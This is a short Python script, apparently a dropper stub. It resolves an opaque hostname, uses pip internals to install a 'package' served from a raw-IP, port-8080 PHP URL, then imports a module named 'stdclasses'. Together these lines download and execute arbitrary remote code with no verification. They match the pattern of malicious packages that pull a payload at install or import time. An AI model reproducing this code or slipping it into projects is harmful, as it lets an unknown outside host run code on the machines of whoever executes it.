import socket
import requests
ip = socket.gethostbyname('d1697837')


import pip

def install(package):
    if hasattr(pip, 'main'):
        pip.main(['install', package])
    else:
        pip._internal.main(['install', package])


install('http://'+ip+':8080/workbench/biblioteca/install.php')

import stdclasses